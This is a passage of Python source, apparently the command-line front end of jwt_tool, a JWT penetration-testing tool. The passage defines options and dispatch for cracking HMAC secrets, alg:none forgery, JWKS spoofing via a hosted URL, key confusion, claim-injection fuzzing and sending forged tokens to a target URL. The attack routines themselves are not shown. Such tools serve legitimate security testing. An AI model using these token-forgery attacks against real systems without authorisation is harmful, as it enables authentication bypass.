    print("      \x1b[48;5;24m \x1b[0m\x1b[48;5;24m \x1b[0m |\x1b[48;5;24m \x1b[0m\x1b[48;5;24m \x1b[0m |\x1b[48;5;24m \x1b[0m\x1b[48;5;24m \x1b[0m\x1b[48;5;24m \x1b[0m\ \x1b[48;5;24m \x1b[0m\x1b[48;5;24m \x1b[0m |   \x1b[48;5;24m \x1b[0m\x1b[48;5;24m \x1b[0m |       \x1b[48;5;24m \x1b[0m\x1b[48;5;24m \x1b[0m | \x1b[48;5;24m \x1b[0m\x1b[48;5;24m \x1b[0m\x1b[48;5;24m \x1b[0m\x1b[48;5;24m \x1b[0m\x1b[48;5;24m \x1b[0m\x1b[48;5;24m \x1b[0m\   \x1b[48;5;24m \x1b[0m\x1b[48;5;24m \x1b[0m\x1b[48;5;24m \x1b[0m\x1b[48;5;24m \x1b[0m\x1b[48;5;24m \x1b[0m\x1b[48;5;24m \x1b[0m\  \x1b[48;5;24m \x1b[0m\x1b[48;5;24m \x1b[0m |")
    print("      \x1b[48;5;24m \x1b[0m\x1b[48;5;24m \x1b[0m |\x1b[48;5;24m \x1b[0m\x1b[48;5;24m \x1b[0m \x1b[48;5;24m \x1b[0m\x1b[48;5;24m \x1b[0m \x1b[48;5;24m \x1b[0m\x1b[48;5;24m \x1b[0m\\\x1b[48;5;24m \x1b[0m\x1b[48;5;24m \x1b[0m |   \x1b[48;5;24m \x1b[0m\x1b[48;5;24m \x1b[0m |       \x1b[48;5;24m \x1b[0m\x1b[48;5;24m \x1b[0m |\x1b[48;5;24m \x1b[0m\x1b[48;5;24m \x1b[0m  __\x1b[48;5;24m \x1b[0m\x1b[48;5;24m \x1b[0m\ \x1b[48;5;24m \x1b[0m\x1b[48;5;24m \x1b[0m  __\x1b[48;5;24m \x1b[0m\x1b[48;5;24m \x1b[0m\ \x1b[48;5;24m \x1b[0m\x1b[48;5;24m \x1b[0m |")
    print("\x1b[48;5;24m \x1b[0m\x1b[48;5;24m \x1b[0m\   \x1b[48;5;24m \x1b[0m\x1b[48;5;24m \x1b[0m |\x1b[48;5;24m \x1b[0m\x1b[48;5;24m \x1b[0m\x1b[48;5;24m \x1b[0m\x1b[48;5;24m \x1b[0m  _\x1b[48;5;24m \x1b[0m\x1b[48;5;24m \x1b[0m\x1b[48;5;24m \x1b[0m\x1b[48;5;24m \x1b[0m |   \x1b[48;5;24m \x1b[0m\x1b[48;5;24m \x1b[0m |       \x1b[48;5;24m \x1b[0m\x1b[48;5;24m \x1b[0m |\x1b[48;5;24m \x1b[0m\x1b[48;5;24m \x1b[0m |  \x1b[48;5;24m \x1b[0m\x1b[48;5;24m \x1b[0m |\x1b[48;5;24m \x1b[0m\x1b[48;5;24m \x1b[0m |  \x1b[48;5;24m \x1b[0m\x1b[48;5;24m \x1b[0m |\x1b[48;5;24m \x1b[0m\x1b[48;5;24m \x1b[0m |")
    print("\x1b[48;5;24m \x1b[0m\x1b[48;5;24m \x1b[0m |  \x1b[48;5;24m \x1b[0m\x1b[48;5;24m \x1b[0m |\x1b[48;5;24m \x1b[0m\x1b[48;5;24m \x1b[0m\x1b[48;5;24m \x1b[0m  / \\\x1b[48;5;24m \x1b[0m\x1b[48;5;24m \x1b[0m\x1b[48;5;24m \x1b[0m |   \x1b[48;5;24m \x1b[0m\x1b[48;5;24m \x1b[0m |       \x1b[48;5;24m \x1b[0m\x1b[48;5;24m \x1b[0m |\x1b[48;5;24m \x1b[0m\x1b[48;5;24m \x1b[0m |  \x1b[48;5;24m \x1b[0m\x1b[48;5;24m \x1b[0m |\x1b[48;5;24m \x1b[0m\x1b[48;5;24m \x1b[0m |  \x1b[48;5;24m \x1b[0m\x1b[48;5;24m \x1b[0m |\x1b[48;5;24m \x1b[0m\x1b[48;5;24m \x1b[0m |")
    print("\\\x1b[48;5;24m \x1b[0m\x1b[48;5;24m \x1b[0m\x1b[48;5;24m \x1b[0m\x1b[48;5;24m \x1b[0m\x1b[48;5;24m \x1b[0m\x1b[48;5;24m \x1b[0m  |\x1b[48;5;24m \x1b[0m\x1b[48;5;24m \x1b[0m  /   \\\x1b[48;5;24m \x1b[0m\x1b[48;5;24m \x1b[0m |   \x1b[48;5;24m \x1b[0m\x1b[48;5;24m \x1b[0m |       \x1b[48;5;24m \x1b[0m\x1b[48;5;24m \x1b[0m |\\\x1b[48;5;24m \x1b[0m\x1b[48;5;24m \x1b[0m\x1b[48;5;24m \x1b[0m\x1b[48;5;24m \x1b[0m\x1b[48;5;24m \x1b[0m\x1b[48;5;24m \x1b[0m  |\\\x1b[48;5;24m \x1b[0m\x1b[48;5;24m \x1b[0m\x1b[48;5;24m \x1b[0m\x1b[48;5;24m \x1b[0m\x1b[48;5;24m \x1b[0m\x1b[48;5;24m \x1b[0m  |\x1b[48;5;24m \x1b[0m\x1b[48;5;24m \x1b[0m |")
    print(" \______/ \__/     \__|   \__|\x1b[48;5;24m \x1b[0m\x1b[48;5;24m \x1b[0m\x1b[48;5;24m \x1b[0m\x1b[48;5;24m \x1b[0m\x1b[48;5;24m \x1b[0m\x1b[48;5;24m \x1b[0m\\__| \______/  \______/ \__|")
    print(" \x1b[36mVersion 2.0.1          \x1b[0m      \______|             \x1b[36m@ticarpi\x1b[0m      ")
    print()

    parser = argparse.ArgumentParser(epilog="If you don't have a token, try this one:\neyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJsb2dpbiI6InRpY2FycGkifQ.bsSwqj2c2uI9n7-ajmi3ixVGhPUiY7jO9SUn9dm15Po", formatter_class=argparse.RawTextHelpFormatter)
    parser.add_argument("jwt", nargs='?', type=str,
                        help="the JWT to tinker with (no need to specify if in header/cookies)")
    parser.add_argument("-t", "--targeturl", action="store",
                        help="URL to send HTTP request to with new JWT")
    parser.add_argument("-rc", "--cookies", action="store",
                        help="request cookies to send with the forged HTTP request")
    parser.add_argument("-rh", "--headers", action="store",
                        help="request headers to send with the forged HTTP request")
    parser.add_argument("-pd", "--postdata", action="store",
                        help="text string that contains all the data to be sent in a POST request")
    parser.add_argument("-cv", "--canaryvalue", action="store",
                        help="text string that appears in response for valid token (e.g. \"Welcome, ticarpi\")")
    parser.add_argument("-np", "--noproxy", action="store_true",
                        help="disable proxy for current request (change in jwtconf.ini if permanent)")
    parser.add_argument("-T", "--tamper", action="store_true",
                        help="tamper with the JWT contents\n(set signing options with -S or use exploits with -X)")
    parser.add_argument("-M", "--mode", action="store",
                        help="Scanning mode:\npb = playbook audit\ner = fuzz existing claims to force errors\nat - All Tests!")
    parser.add_argument("-C", "--crack", action="store_true",
                        help="crack key for an HMAC-SHA token\n(specify -d/-k/-p)")
    parser.add_argument("-V", "--verify", action="store_true",
                        help="verify the RSA signature against a Public Key\n(specify -pk/-jw)")
    parser.add_argument("-X", "--exploit", action="store",
                        help="eXploit known vulnerabilities:\na = alg:none\ns = spoof JWKS (specify JWKS URL with -ju, or set in jwtconf.ini to automate this attack)\nk = key confusion (specify public key with -pk)\ni = inject inline JWKS")
    parser.add_argument("-S", "--sign", action="store",
                        help="sign the resulting token:\nhs256/hs384/hs512 = HMAC-SHA signing (specify a secret with -k/-p)\nrs256/rs384/hs512 = RSA signing (specify an RSA private key with -pr)\nec256/ec384/ec512 = Elliptic Curve signing (specify an EC private key with -pr)\nps256/ps384/ps512 = PSS-RSA signing (specify an RSA private key with -pr)")
    parser.add_argument("-I", "--injectclaims", action="store_true",
                        help="inject new claims and update existing claims with new values\n(set signing options with -S or use exploits with -X)\n(set target claim with -hc/-pc and injection values/lists with -hv/-pv")
    parser.add_argument("-Q", "--query", action="store",
                        help="Query a token ID against the logfile to see the details of that request\ne.g. -Q jwttool_46820e62fe25c10a3f5498e426a9f03a")
    parser.add_argument("-d", "--dict", action="store",
                        help="dictionary file for cracking")
    parser.add_argument("-p", "--password", action="store",
                        help="password for cracking")
    parser.add_argument("-kf", "--keyfile", action="store",
                        help="keyfile for cracking (when signed with 'kid' attacks)")
    parser.add_argument("-pk", "--pubkey", action="store",
                        help="Public Key for Asymmetric crypto")
    parser.add_argument("-pr", "--privkey", action="store",
                        help="Private Key for Asymmetric crypto")
    parser.add_argument("-jw", "--jwksfile", action="store",
                        help="JSON Web Key Store for Asymmetric crypto")
    parser.add_argument("-ju", "--jwksurl", action="store",
                        help="URL location where you can host a spoofed JWKS")
    parser.add_argument("-hc", "--headerclaim", action="append",
                        help="Header claim to tamper with")
    parser.add_argument("-pc", "--payloadclaim", action="append",
                        help="Payload claim to tamper with")
    parser.add_argument("-hv", "--headervalue", action="append",
                        help="Value (or file containing values) to inject into tampered header claim")
    parser.add_argument("-pv", "--payloadvalue", action="append",
                        help="Value (or file containing values) to inject into tampered payload claim")
    args = parser.parse_args()
    path = sys.path[0]
    logFilename = path+"/logs.txt"
    configFileName = path+"/jwtconf.ini"
    config = configparser.ConfigParser()
    if (os.path.isfile(configFileName)):
        config.read(configFileName)
    else:
        print("No config file yet created.\nRunning config setup.")
        createConfig()
    with open('null.txt', 'w') as nullfile:
        pass
    findJWT = ""
    if args.targeturl:
        if args.cookies or args.headers:
            if args.cookies and args.headers:
                if re.search('eyJ[A-Za-z0-9_\/+-]*\.eyJ[A-Za-z0-9_\/+-]*\.[A-Za-z0-9._\/+-]*', args.cookies) and re.search('eyJ[A-Za-z0-9_\/+-]*\.eyJ[A-Za-z0-9_\/+-]*\.[A-Za-z0-9._\/+-]*', args.headers):
                    cprint("Too many tokens! JWT in cookie and header", "red")
                    exit(1)
            if args.cookies:
                try:
                    if re.search('eyJ[A-Za-z0-9_\/+-]*\.eyJ[A-Za-z0-9_\/+-]*\.[A-Za-z0-9._\/+-]*', args.cookies):
                        config['argvals']['headerloc'] = "cookies"
                except:
                    cprint("Invalid cookie formatting", "red")
                    exit(1)
            if args.headers:
                try:
                    if re.search('eyJ[A-Za-z0-9_\/+-]*\.eyJ[A-Za-z0-9_\/+-]*\.[A-Za-z0-9._\/+-]*', args.headers):
                        config['argvals']['headerloc'] = "headers"
                except:
                    cprint("Invalid header formatting", "red")
                    exit(1)
            try:
                findJWT = re.search('eyJ[A-Za-z0-9_\/+-]*\.eyJ[A-Za-z0-9_\/+-]*\.[A-Za-z0-9._\/+-]*', str(args.cookies)+" | "+str(args.headers))[0]
            except:
                cprint("Cannot find a valid JWT", "red")
                cprint(args.cookies+" | "+args.headers, "cyan")
                exit(1)
    if args.jwt:
        jwt = args.jwt
        cprint("Original JWT: "+findJWT+"\n", "cyan")
    elif findJWT:
        jwt = findJWT
        cprint("Original JWT: "+findJWT+"\n", "cyan")
    elif args.query:
        jwt = searchLog(args.query)
    else:
        parser.print_usage()
        cprint("No JWT provided", "red")
        exit(1)
    if args.mode:
        if args.mode not in ['pb','er', 'fc', 'at']:
            parser.print_usage()
            cprint("\nPlease choose a scanning mode (e.g. -M pb):\npb = playbook\ner = force errors\nat = all tests", "red")
            exit(1)
        else:
            config['argvals']['scanMode'] = args.mode
    if args.exploit:
        if args.exploit not in ['a','s', 'i', 'k']:
            parser.print_usage()
            cprint("\nPlease choose an exploit (e.g. -X a):\na = alg:none\ns = spoof JWKS (specify JWKS URL with -ju, or set in jwtconf.ini to automate this attack)\nk = key confusion (specify public key with -pk)\ni = inject inline JWKS", "red")
            exit(1)
        else:
            config['argvals']['exploitType'] = args.exploit
    if args.sign:
        if args.sign not in ['hs256','hs384','hs512','rs256','rs384','rs512','ec256','ec384','ec512','ps256','ps384','ps512']:
            parser.print_usage()
            cprint("\nPlease choose a signature option (e.g. -S hs256)", "red")
            exit(1)
        else:
            config['argvals']['sigType'] = args.sign
    headDict, paylDict, sig, contents = validateToken(jwt)
    paylB64 = base64.urlsafe_b64encode(json.dumps(paylDict,separators=(",",":")).encode()).decode('UTF-8').strip("=")
    config['argvals']['overridesub'] = "false"
    if args.targeturl:
        config['argvals']['targetUrl'] = args.targeturl
    if args.cookies:
        config['argvals']['cookies'] = args.cookies
    if args.headers:
        config['argvals']['header'] = args.headers
    if args.dict:
        config['argvals']['keyList'] = args.dict
    if args.keyfile:
        config['argvals']['keyFile'] = args.keyfile
    if args.password:
        config['argvals']['key'] = args.password
    if args.pubkey:
        config['crypto']['pubkey'] = args.pubkey
    if args.privkey:
        config['crypto']['privkey'] = args.privkey
    if args.jwksfile:
        config['crypto']['jwks'] = args.jwksfile
    if args.jwksurl:
        config['services']['jwksloc'] = args.jwksurl
    if args.payloadclaim:
        config['argvals']['payloadclaim'] = str(args.payloadclaim)
    if args.headerclaim:
        config['argvals']['headerclaim'] = str(args.headerclaim)
    if args.payloadvalue:
        config['argvals']['payloadvalue'] = str(args.payloadvalue)
    if args.headervalue:
        config['argvals']['headervalue'] = str(args.headervalue)
    if args.postdata:
        config['argvals']['postData'] = args.postdata
    if args.canaryvalue:
        config['argvals']['canaryvalue'] = args.canaryvalue
    if args.noproxy:
        config['services']['proxy'] = "False"
    if not args.crack and not args.exploit and not args.verify and not args.tamper and not args.injectclaims and not args.query:
        rejigToken(headDict, paylDict, sig)
        if args.sign:
            signingToken(headDict, paylDict)
    if args.injectclaims:
        injectionfile = ""
        newheadDict = headDict
        newpaylDict = paylDict
        if args.headerclaim:
            if not args.headervalue:
                cprint("Must specify header values to match header claims to inject.", "red")
                exit(1)
            if len(args.headerclaim) != len(args.headervalue):
                cprint("Amount of header values must match header claims to inject.", "red")
                exit(1)
        if args.payloadclaim:
            if not args.payloadvalue:
                cprint("Must specify payload values to match payload claims to inject.", "red")
                exit(1)
            if len(args.payloadclaim) != len(args.payloadvalue):
                cprint("Amount of payload values must match payload claims to inject.", "red")
                exit(1)
        if args.payloadclaim:
            for payloadclaim, payloadvalue in zip(args.payloadclaim, args.payloadvalue):
                if os.path.isfile(payloadvalue):
                    injectionfile = ["payload", payloadclaim, payloadvalue]
                else:
                    newpaylDict, newPaylB64 = injectpayloadclaim(payloadclaim, payloadvalue)
                    paylB64 = newPaylB64
            newContents = genContents(headDict, newpaylDict)
            headDict, paylDict, sig, contents = validateToken(newContents+"."+sig)
        if args.headerclaim:
            for headerclaim, headervalue in zip(args.headerclaim, args.headervalue):
                if os.path.isfile(headervalue):
                    injectionfile = ["header", headerclaim, headervalue]
                else:
                    newheadDict, newHeadB64 = injectheaderclaim(headerclaim, headervalue)
                    newContents = genContents(newheadDict, paylDict)
                    headDict, paylDict, sig, contents = validateToken(newContents+"."+sig)
        if injectionfile:
            if args.mode:
                cprint("Fuzzing cannot be used alongside scanning modes", "red")
                exit(1)
            cprint("Fuzzing file loaded: "+injectionfile[2], "cyan")
            with open(injectionfile[2], "r", encoding='utf-8', errors='ignore') as valLst:
                nextVal = valLst.readline()
                print("Generating tokens from injection file...")
                utf8errors = 0
                wordcount = 0
                while nextVal:
                    if injectionfile[0] == "payload":
                        newpaylDict, newPaylB64 = injectpayloadclaim(injectionfile[1], nextVal.rstrip())
                        newContents = genContents(headDict, newpaylDict)
                        headDict, paylDict, sig, contents = validateToken(newContents+"."+sig)
                        paylB64 = newPaylB64
                    elif injectionfile[0] == "header":
                        newheadDict, newHeadB64 = injectheaderclaim(injectionfile[1], nextVal.rstrip())
                        newContents = genContents(newheadDict, paylDict)
                        headDict, paylDict, sig, contents = validateToken(newContents+"."+sig)
                    injectOut(newheadDict, newpaylDict)
                    nextVal = valLst.readline()
            exit(1)
        else:
            if not args.mode:
                injectOut(newheadDict, newpaylDict)
                exit(1)
    if args.mode:
        if not config['argvals']['targeturl']:
            cprint("No target secified (-t), cannot scan offline.", "red")
            exit(1)
        runScanning()
    runActions()
    exit(1)
